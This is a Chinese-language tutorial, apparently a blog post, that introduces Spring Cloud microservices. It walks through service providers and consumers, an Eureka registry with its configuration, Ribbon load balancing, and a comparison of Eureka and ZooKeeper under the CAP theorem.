<h2 id="1-5-为什么选择Spring-Cloud构建微服务"><a href="#1-5-为什么选择Spring-Cloud构建微服务" class="headerlink" title="1.5 为什么选择Spring Cloud构建微服务"></a>1.5 为什么选择Spring Cloud构建微服务</h2><p>微服务一词是Martin Fowler（马丁.福勒）于2014年提出来的，近几年微服务架构的讨论非常火热，无数的架构师和开发者在实际项目中实践着微服务架构的设计理念，他们在微服务架构中针对不同应用场景出现的各种问题，也推出了很多解决方案和开源框架，其中我们国内的互联网企业也有一些著名的框架和方案；</p>
<p>整个微服务架构是由大量的技术框架和方案构成，比如：</p>
<table>
<thead>
<tr>
<th>服务基础开发</th>
<th>Spring MVC、Spring、SpringBoot</th>
</tr>
</thead>
<tbody><tr>
<td>服务注册与发现</td>
<td>Netflix的Eureka、Apache的ZooKeeper等</td>
</tr>
<tr>
<td>服务调用</td>
<td>RPC调用有阿里巴巴的Dubbo，Rest方式调用有当当网Dubbo基础上扩展的Dubbox、还有其他方式实现的Rest，比如Ribbon、Feign</td>
</tr>
<tr>
<td>分布式配置管理</td>
<td>百度的Disconf、360的QConf、淘宝的Diamond、Netflix的Archaius等</td>
</tr>
<tr>
<td>负载均衡</td>
<td>Ribbon</td>
</tr>
<tr>
<td>服务熔断</td>
<td>Hystrix</td>
</tr>
<tr>
<td>API网关</td>
<td>Zuul</td>
</tr>
<tr>
<td>批量任务</td>
<td>当当网的Elastic-Job、Linkedln的Azkaban</td>
</tr>
<tr>
<td>服务跟踪</td>
<td>京东的Hydra、Twitter的Zipkin等</td>
</tr>
</tbody></table>
<p>但是在微服务架构上，几乎大部分的开源组件都只能解决某一个场景下的问题，所以这些实施微服务架构的公司也是整合来自不同公司或组织的诸多开源框架，并加入针对自身业务的一些改进，没有一个统一的架构方案；</p>
<p>所以当我们准备实施微服务架构时，我们要整合各个公司或组织的开源软件，而且某些开源软件又有多种选择，这导致在做技术选型的初期，需要花费大量的时间进行预备研、分析和实验，这些方案的整合没有得到充分的测试，可能在实践中会遇到各种各样的问题；</p>
<p>Spring Cloud的出现，可以说是为微服务架构迎来一缕曙光，有SpringCloud社区的巨大支持和技术保障，让我们实施微服务架构变得异常简单了起来，它不像我们之前所列举的框架那样，只是解决微服务中的某一个问题，而是一个解决微服务架构实施的综合性解决框架，它整合了诸多被广泛实践和证明有效的框架作为实施的基础组件，又在该体系基础上创建了一些非常优秀的边缘组件将它们很好地整合起来。</p>
<p>加之Spring Cloud 有其Spring 的强大技术背景，极高的社区活跃度，也许未来Spring Cloud会成为微服务的标准技术解决方案；</p>
<h1 id="第二章-认识Spring-Cloud"><a href="#第二章-认识Spring-Cloud" class="headerlink" title="第二章 认识Spring Cloud"></a>第二章 认识Spring Cloud</h1><h2 id="2-1-Spring-Cloud是什么"><a href="#2-1-Spring-Cloud是什么" class="headerlink" title="2.1 Spring Cloud是什么"></a>2.1 Spring Cloud是什么</h2><ol>
<li><p>Spring Cloud是一个一站式的开发分布式系统的框架，为开发者提供了一系列的构建分布式系统的工具集；</p>
</li>
<li><p>Spring Cloud为开发人员提供了快速构建分布式系统中一些常见模式的工具（比如：配置管理，服务发现，断路器，智能路由、微代理、控制总线、全局锁、决策竞选、分布式会话和集群状态管理等）；</p>
</li>
<li><p>开发分布式系统都需要解决一系列共同关心的问题，而使用Spring Cloud可以快速地实现这些分布式开发共同关心的问题，并能方便地在任何分布式环境中部署与运行。</p>
</li>
<li><p>Spring Cloud这个一站式地分布式开发框架，被近年来流行的“微服务”架构所大力推崇，成为目前进行微服务架构的优先选择工具；</p>
</li>
<li><p>Spring Cloud基于Spring Boot框架构建微服务架构，学习Spring Cloud需要先学习Spring Boot；</p>
</li>
<li><p>SpringCloud官网：<a href="http://spring.io/">http://spring.io</a></p>
</li>
</ol>
<h2 id="2-2-Spring-Cloud的版本"><a href="#2-2-Spring-Cloud的版本" class="headerlink" title="2.2 Spring Cloud的版本"></a>2.2 Spring Cloud的版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Spring Cloud最早是从2014年推出的，在推出的前期更新迭代速度非常快，频繁发布新版本，目前更趋于稳定，变化稍慢一些；</span><br><span class="line">Spring Cloud的版本并不是传统的使用数字的方式标识，而是使用诸如：Angel、Brixton、Camden......等伦敦的地名来命名版本，版本的先后顺序使用字母表A-Z的先后来标识,，现在已经进入H版本；Hoxton.RC2版本，对应SpringBoot 2.2.x</span><br></pre></td></tr></table></figure>

<p>Spring Cloud与Spring Boot版本匹配关系</p>
<table>
<thead>
<tr>
<th>Finchley</th>
<th>兼容Spring Boot 2.0.x，  不兼容Spring Boot 1.5.x</th>
</tr>
</thead>
<tbody><tr>
<td>Edgware</td>
<td>兼容Spring Boot 1.5.x，  不兼容Spring Boot 2.0.x</td>
</tr>
<tr>
<td>Dalston</td>
<td>兼容Spring Boot 1.5.x，  不兼容Spring Boot 2.0.x</td>
</tr>
<tr>
<td>Camden</td>
<td>兼容Spring Boot 1.4.x，  也兼容Spring Boot 1.5.x</td>
</tr>
<tr>
<td>Brixton</td>
<td>兼容Spring Boot 1.3.x，  也兼容Spring Boot 1.4.x</td>
</tr>
<tr>
<td>Angel</td>
<td>兼容Spring Boot 1.2.x</td>
</tr>
</tbody></table>
<p>Spring Cloud并不是从0开始开发一整套微服务解决方案，而是集成各个开源软件，构成一整套的微服务解决方案，这其中有非常著名的Netflix公司的开源产品；</p>
<p>Netflix公司成立于1997年，是目前美国最大的版权视频交易网站；</p>
<p>Netflix公司在不断发展的过程中，也成为了一家云计算公司，并积极参与开源项目，Netflix OSS（Open Source）就是由Netflix公司主持开发的一套代码框架和库，github地址：<a href="https://github.com/Netflix%EF%BC%9B">https://github.com/Netflix；</a></p>
<p>Spring Cloud 所包含的众多组件中，Spring Cloud Netflix就是其中一组不可忽视的组件，由netflix公司开发后又并入Spring Cloud 大家庭；</p>
<p>目前Netflix公司贡献的活跃项目包括：</p>
<p>spring-cloud-netflix-eureka</p>
<p>spring-cloud-netflix-hystrix</p>
<p>spring-cloud-netflix-stream</p>
<p>spring-cloud-netflix-archaius</p>
<p>spring-cloud-netflix-ribbon</p>
<p>spring-cloud-netflix-zuul</p>
<h2 id="2-3-Spring-Cloud开发环境"><a href="#2-3-Spring-Cloud开发环境" class="headerlink" title="2.3 Spring Cloud开发环境"></a>2.3 Spring Cloud开发环境</h2><p>SpringBoot 2.2.x</p>
<p>Spring Cloud Hoxton xxx</p>
<p>Maven 3.5.3</p>
<p>JDK 1.8.152</p>
<p>IntelliJ IDEA</p>
<h2 id="2-4-Spring-Cloud的整体架构"><a href="#2-4-Spring-Cloud的整体架构" class="headerlink" title="2.4 Spring Cloud的整体架构"></a>2.4 Spring Cloud的整体架构</h2><p>  <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212134871.png" alt="image-20201216192902340">                             </p>
<p>Service Provider： 暴露服务的服务提供方。</p>
<p>Service Consumer：调用远程服务的服务消费方。</p>
<p>EureKa Server： 服务注册中心和服务发现中心。</p>
<h1 id="第三章-Spring-Cloud快速开发入门"><a href="#第三章-Spring-Cloud快速开发入门" class="headerlink" title="第三章 Spring Cloud快速开发入门"></a>第三章 Spring Cloud快速开发入门</h1><h2 id="3-1-搭建和配置一个服务提供者"><a href="#3-1-搭建和配置一个服务提供者" class="headerlink" title="3.1 搭建和配置一个服务提供者"></a>3.1 搭建和配置一个服务提供者</h2><p>我们知道，SpringCloud构建微服务是基于SpringBoot开发的。</p>
<ol>
<li><p>创建一个SpringBoot工程（SpringBoot的Web工程），并且添加SpringBoot的相关依赖；</p>
</li>
<li><p>创建服务提供者的访问方法，也就是后续消费者如何访问提供者；</p>
<p>Spring Cloud是基于rest的访问，所以我们添加一个Controller，在该Controller中提供一个访问入口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/hello&quot;, method = RequestMethod.GET)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello Spring Cloud&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


</li>
<li><p>启动运行该SpringBoot程序，访问该controller；</p>
</li>
</ol>
<h2 id="3-2-搭建和配置一个服务消费者"><a href="#3-2-搭建和配置一个服务消费者" class="headerlink" title="3.2 搭建和配置一个服务消费者"></a>3.2 搭建和配置一个服务消费者</h2><p>服务消费者也是一个SpringBoot项目，服务消费者主要用来消费服务提供者提供的服务；</p>
<ol>
<li><p>创建一个SpringBoot工程（SpringBoot的Web工程），并且添加SpringBoot的相关依赖；</p>
</li>
<li><p>定义自定义类RestTemplateConfig类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 标记当前类是一个Spring配置类，用于模拟Spring的配置文件</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RestTemplateConfig</span> &#123;</span><br><span class="line"><span class="comment">//@Bean标记当前方法是一个Spring配置方法，用于模拟Spring配置文件中的Bean标签</span></span><br><span class="line"><span class="comment">//其中方法的返回值相当于Bean标签的class</span></span><br><span class="line"><span class="comment">//其中方法的名字相当于Bean标签的id</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RestTemplate <span class="title function_">restTemplate</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
</li>
<li><p>开发一个消费者方法，去消费服务提供者提供的服务，这个消费者方法也是一个Controller:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * SpringCloud的消费者端，消费就是一个普通的SpringBoot的web工程</span></span><br><span class="line"><span class="comment"> * 这里需要使用Http协议访问服务提供者</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//访问远程的SpringCloud的服务</span></span><br><span class="line">        <span class="comment">//参数1 为服务器的地址以及服务器的请求名</span></span><br><span class="line">        <span class="comment">//参数2 用于指定返回的数据类型是字符格式</span></span><br><span class="line">        <span class="comment">//.getBody()方法的作用是获取响应的主体内容（服务端返回的具体JSON数据）</span></span><br><span class="line">        <span class="keyword">return</span> restTemplate.getForEntity(<span class="string">&quot;http://localhost:8081/test&quot;</span>,String.class).getBody()+<span class="string">&quot;  -----SpringCloud的消费者&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动该SpringBoot程序，测试服务消费者调用服务提供者</p>
</li>
</ol>
<h2 id="3-3-走进服务注册中心Eureka"><a href="#3-3-走进服务注册中心Eureka" class="headerlink" title="3.3 走进服务注册中心Eureka"></a>3.3 走进服务注册中心Eureka</h2><p>在微服务架构中，服务注册与发现是核心组件之一，手动指定每个服务是很低效的，Spring Cloud提供了多种服务注册与发现的实现方式，例如：Eureka、Consul、Zookeeper。</p>
<p>Spring Cloud支持得最好的是Eureka，其次是Consul，再次是Zookeeper。</p>
<p><strong>什么是服务注册？</strong></p>
<p>服务注册：将服务所在主机、端口、版本号、通信协议等信息登记到注册中心上；</p>
<p><strong>什么是服务发现？</strong></p>
<p>服务发现：服务消费者向注册中心请求已经登记的服务列表，然后得到某个服务的主机、端口、版本号、通信协议等信息，从而实现对具体服务的调用；</p>
<p><strong>Eureka是什么？</strong></p>
<p>Eureka是一个服务治理组件，它主要包括服务注册和服务发现，主要用来搭建服务注册中心。</p>
<p>Eureka 是一个基于 REST 的服务，用来定位服务，进行中间层服务器的负载均衡和故障转移；</p>
<p>Eureka是Netflix 公司开发的，Spring Cloud 封装了 Netflix 公司开发的 Eureka 模块来实现服务注册和发现，也就是说Spring Cloud对Netflix Eureka 做了二次封装；</p>
<p>Eureka 采用了C-S（客户端&#x2F;服务端）的设计架构，也就是Eureka由两个组件组成：Eureka服务端和Eureka客户端。Eureka Server 作为服务注册的服务端，它是服务注册中心，而系统中的其他微服务，使用 Eureka 的客户端连接到 Eureka Server服务端，并维持心跳连接，Eureka客户端是一个Java客户端，用来简化与服务器的交互、负载均衡，服务的故障切换等；</p>
<p>有了Eureka注册中心，系统的维护人员就可以通过 Eureka Server 来监控系统中各个微服务是否正常运行。</p>
<h2 id="3-4-Eureka与Zookeeper的比较"><a href="#3-4-Eureka与Zookeeper的比较" class="headerlink" title="3.4 Eureka与Zookeeper的比较"></a>3.4 Eureka与Zookeeper的比较</h2><p>著名的CAP理论指出，一个分布式系统不可能同时满足Consistency(一致性)、Availability(可用性)和Partition tolerance(分区容错性)。</p>
<p>由于分区容错性在是分布式系统中必须要保证的，因此我们只能在A和C之间进行权衡，在此Zookeeper保证的是CP, 而Eureka则是AP。</p>
<p><strong>Zookeeper保证CP</strong></p>
<p>在ZooKeeper中，当master节点因为网络故障与其他节点失去联系时，剩余节点会重新进行leader选举，但是问题在于，选举leader需要一定时间, 且选举期间整个ZooKeeper集群都是不可用的，这就导致在选举期间注册服务瘫痪。在云部署的环境下，因网络问题使得ZooKeeper集群失去master节点是大概率事件，虽然服务最终能够恢复，但是在选举时间内导致服务注册长期不可用是难以容忍的。</p>
<p><strong>Eureka保证AP</strong></p>
<p>Eureka优先保证可用性，Eureka各个节点是平等的，某几个节点挂掉不会影响正常节点的工作，剩余的节点依然可以提供注册和查询服务。而Eureka的客户端在向某个Eureka注册或时如果发现连接失败，则会自动切换至其它节点，只要有一台Eureka还在，就能保证注册服务可用(保证可用性)，只不过查到的信息可能不是最新的(不保证强一致性)。</p>
<p>所以Eureka在网络故障导致部分节点失去联系的情况下，只要有一个节点可用，那么注册和查询服务就可以正常使用，而不会像zookeeper那样使整个注册服务瘫痪，Eureka优先保证了可用性。</p>
<h2 id="3-5-搭建与配置Eureka服务注册中心"><a href="#3-5-搭建与配置Eureka服务注册中心" class="headerlink" title="3.5 搭建与配置Eureka服务注册中心"></a>3.5 搭建与配置Eureka服务注册中心</h2><p>Spring Cloud要使用Eureka注册中心非常简单和方便，Spring Cloud中的Eureka服务注册中心实际上也是一个Spring Boot工程，我们只需通过引入相关依赖和注解配置就能让Spring Boot构建的微服务应用轻松地与Eureka进行整合。</p>
<p>具体步骤如下：</p>
<ol>
<li><p>创建一个SpringBoot项目02-springcloud-eureka-server，并且添加SpringBoot的相关依赖；</p>
</li>
<li><p>添加eureka的依赖：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;!--Spring Cloud的eureka-server起步依赖--&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


</li>
<li><p>必须添加Maven的依赖管理器，否则eureka无法被识别</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencyManagement&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;$&#123;spring-cloud.version&#125;&lt;/version&gt;</span><br><span class="line">            &lt;type&gt;pom&lt;/type&gt;</span><br><span class="line">            &lt;scope&gt;<span class="keyword">import</span>&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line">&lt;/dependencyManagement&gt;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>注意：如果通过SpringBoot的开发工具创建Web工程那么这个依赖以及依赖管理是自动添加 的</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212134873.png" alt="image-20201216203512922"></p>
</li>
<li><p>在application.properties文件中配置Eureka服务注册中心信息：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#内嵌定时tomcat的端口</span><br><span class="line">server.port=<span class="number">9100</span></span><br><span class="line">#设置该服务注册中心的hostname</span><br><span class="line">eureka.instance.hostname=localhost</span><br><span class="line">#由于我们目前创建的应用是一个服务注册中心，而不是普通的应用，默认情况下，这个应用会向注册中心（也是它自己）注册它自己，设置为<span class="literal">false</span>表示禁止这种自己向自己注册的默认行为</span><br><span class="line">eureka.client.register-with-eureka=<span class="literal">false</span></span><br><span class="line">#表示不去检索其他的服务，因为服务注册中心本身的职责就是维护服务实例，它不需要去检索其他服务</span><br><span class="line">eureka.client.fetch-registry=<span class="literal">false</span></span><br><span class="line">#指定服务注册中心的位置</span><br><span class="line">eureka.client.service-url.defaultZone=http:<span class="comment">//$&#123;eureka.instance.hostname&#125;:$&#123;server.port&#125;/eureka</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>在Spring Boot的入口类上添加一个@EnableEurekaServer注解，用于开启Eureka注册中心服务端</p>
</li>
</ol>
<h2 id="3-6-启动与测试Eureka服务注册中心"><a href="#3-6-启动与测试Eureka服务注册中心" class="headerlink" title="3.6 启动与测试Eureka服务注册中心"></a>3.6 启动与测试Eureka服务注册中心</h2><ol>
<li><p>完成上面的项目搭建后，我们就可以启动SpringBoot程序，main方法运行；</p>
</li>
<li><p>启动成功之后，通过在浏览器地址栏访问我们的注册中心；浏览器输入<a href="http://localhost:9100/">http://localhost:9100</a> 来测试Eureka是否启动</p>
</li>
</ol>
<h2 id="3-7-向Eureka服务注册中心注册服务"><a href="#3-7-向Eureka服务注册中心注册服务" class="headerlink" title="3.7 向Eureka服务注册中心注册服务"></a>3.7 向Eureka服务注册中心注册服务</h2><p>我们前面搭建了服务提供者项目，接下来我们就可以将该服务提供者注册到Eureke注册中心，步骤如下：</p>
<ol>
<li>在该服务提供者中添加eureka的依赖，因为服务提供者向注册中心注册服务，需要连接eureka，所以需要eureka客户端的支持；</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;!--SpringCloud集成eureka客户端的起步依赖--&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>必须添加Maven的依赖管理器，否则eureka无法被识别</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencyManagement&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;$&#123;spring-cloud.version&#125;&lt;/version&gt;</span><br><span class="line">            &lt;type&gt;pom&lt;/type&gt;</span><br><span class="line">            &lt;scope&gt;<span class="keyword">import</span>&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line">&lt;/dependencyManagement&gt;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>注意：如果通过SpringBoot的开发工具创建Web工程那么这个依赖以及依赖管理是自动添加 的</p>
<p>  <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212134874.png" alt="image-20201216204047337"></p>
<ol start="3">
<li>修改服务提供者的application.properties文件，配置服务名称和注册中心地址</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#指定服务名字 这个名称将在服务消费者时被调用</span><br><span class="line">spring.application.name= <span class="number">02</span>-springcloud-eureka-client-provider</span><br><span class="line">#指定eureka的访问地址</span><br><span class="line">eureka.client.service-url.defaultZone=http:<span class="comment">//localhost:9100/eureka</span></span><br><span class="line">#指定Tomcat的端口号需要避免和其他的Tomcat端口冲突</span><br><span class="line">server.port=<span class="number">8081</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<ol start="4">
<li><p>激活Eureka中的EnableEurekaClient功能：</p>
<p>在Spring Boot的入口函数处，通过添加@EnableEurekaClient注解来表明自己是一个eureka客户端，让我的服务消费者可以使用eureka注册中心</p>
</li>
<li><p>编写控制器提供服务</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//自定义控制器类对外提供服务</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;使用了eureka注册中心的服务提供者&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="6">
<li><p>启动服务提供者SpringBoot程序的main方法运行；</p>
</li>
<li><p>启动运行之后，通过在浏览器地址栏访问我们之前搭建好的eureka注册中心，就可以看到有一个服务已经注册成功了；</p>
</li>
</ol>
<h2 id="3-8-从Eureka服务注册中心发现与消费服务"><a href="#3-8-从Eureka服务注册中心发现与消费服务" class="headerlink" title="3.8 从Eureka服务注册中心发现与消费服务"></a>3.8 从Eureka服务注册中心发现与消费服务</h2><p>我们已经搭建一个服务注册中心，同时也向这个服务注册中心注册了服务，接下来我们就可以发现和消费服务了，这其中服务的发现由eureka客户端实现，而服务的消费由Ribbon实现，也就是说服务的调用需要eureka客户端和Ribbon两者配合起来才能实现；</p>
<p><strong>Eureka客户端是什么？</strong></p>
<p>Eureka客户端是一个Java客户端，用来连接Eureka服务端，与服务端进行交互、负载均衡，服务的故障切换等；</p>
<p><strong>Ribbon是什么？</strong></p>
<p>Ribbon是一个基于HTTP 和 TCP 的客户端负载均衡器，当使用Ribbon对服务进行访问的时候，它会扩展Eureka客户端的服务发现功能，实现从Eureka注册中心中获取服务端列表，并通过Eureka客户端来确定服务端是否己经启动。Ribbon在Eureka客户端服务发现的基础上，实现了对服务实例的选择策略，从而实现对服务的负载均衡消费。</p>
<p>接下来我们来让服务消费者去消费服务：</p>
<p>我们前面搭建了服务消费者项目，接下来我们就可以使用该服务消费者通过注册中心去调用服务提供者，步骤如下：</p>
<ol>
<li>在该消费者项目中添加eureka的依赖，因为服务消费者从注册中心获取服务，需要连接eureka，所以需要eureka客户端的支持；</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;!--SpringCloud集成eureka客户端的起步依赖--&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<ol start="2">
<li>必须添加Maven的依赖管理器，否则eureka无法被识别</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencyManagement&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;$&#123;spring-cloud.version&#125;&lt;/version&gt;</span><br><span class="line">            &lt;type&gt;pom&lt;/type&gt;</span><br><span class="line">            &lt;scope&gt;<span class="keyword">import</span>&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line">&lt;/dependencyManagement&gt;</span><br><span class="line"> </span><br><span class="line">注意：如果通过SpringBoot的开发工具创建Web工程那么这个依赖以及依赖管理是自动添加 的</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>配置服务的名称和注册中心的地址：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#指定服务的名称 即使是服务的消费者也会将自己注册到注册中心</span><br><span class="line">spring.application.name=02-springcloud-eureka-client-consumer</span><br><span class="line">#指定Eureka注册中的访问地址</span><br><span class="line">eureka.client.service-url.defaultZone=http://localhost:9100/eureka</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><p>激活Eureka中的EnableEurekaClient功能：</p>
<p>在Spring Boot的入口函数处，通过添加@EnableEurekaClient注解来表明自己是一个eureka客户端，让我的服务消费者可以使用eureka注册中心；</p>
</li>
<li><p>前面我介绍了服务的发现由eureka客户端实现，而服务的真正调用由ribbon实现，所以我们需要在调用服务提供者时使用ribbon来调用：</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RestTemplateConfig</span> &#123;</span><br><span class="line">    <span class="comment">//使用Ribbon的负载均衡从注册中心中获取服务</span></span><br><span class="line">    <span class="meta">@LoadBalanced</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RestTemplate <span class="title function_">restTemplate</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="6">
<li><p>调用服务<br>加入了ribbon的支持，那么在调用时，即可改为使用服务名称来访问：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//访问SpringCloud 提供的服务，但是这里我们不需要再次指定服务提供者的地址了，只需要通过服务的名字到</span></span><br><span class="line">        <span class="comment">//Eureka的注册中心中找到对应的服务提供者</span></span><br><span class="line">        <span class="comment">//其中02-SPRINGCLOUD-EUREKA-CLIENT-PROVIDER 就是服务的提供的服务名</span></span><br><span class="line">        <span class="keyword">return</span> restTemplate.getForEntity(<span class="string">&quot;http://02-SPRINGCLOUD-EUREKA-CLIENT-PROVIDER/test&quot;</span>,String.class).getBody()+<span class="string">&quot;----带有注册中心的服务消费者&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


</li>
<li><p>完成上面的步骤后，我们就可以启动消费者的SpringBoot程序，main方法运行；</p>
</li>
<li><p>启动成功之后，通过在浏览器地址栏访问我们的消费者，看是否可以正常调用远程服务提供者提供的服务；浏览器输入<a href="http://localhost:8080/test">http://localhost:8080/test</a> 进行测试</p>
</li>
</ol>
<h1 id="第四章-服务注册中心Eureka"><a href="#第四章-服务注册中心Eureka" class="headerlink" title="第四章 服务注册中心Eureka"></a>第四章 服务注册中心Eureka</h1><h2 id="4-1-Eureka注册中心高可用集群概述"><a href="#4-1-Eureka注册中心高可用集群概述" class="headerlink" title="4.1 Eureka注册中心高可用集群概述"></a>4.1 Eureka注册中心高可用集群概述</h2><p>在微服务架构的这种分布式系统中，我们要充分考虑各个微服务组件的高可用性问题，不能有单点故障，由于注册中心eureka本身也是一个服务，如果它只有一个节点，那么它有可能发生故障，这样我们就不能注册与查询服务了，所以我们需要一个高可用的服务注册中心，这就需要通过注册中心集群来解决。</p>
<p>eureka服务注册中心它本身也是一个服务，它也可以看做是一个提供者，又可以看做是一个消费者，我们之前通过配置：</p>
<p>eureka.client.register-with-eureka&#x3D;false 让注册中心不注册自己，但是我们可以向其他注册中心注册自己；</p>
<p>Eureka Server的高可用实际上就是将自己作为服务向其他服务注册中心注册自己，这样就会形成一组互相注册的服务注册中心，进而实现服务清单的互相同步，往注册中心A上注册的服务，可以被复制同步到注册中心B上，所以从任何一台注册中心上都能查询到已经注册的服务，从而达到高可用的效果。</p>
<p> <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212134875.png" alt="image-20201216210302515">                              </p>
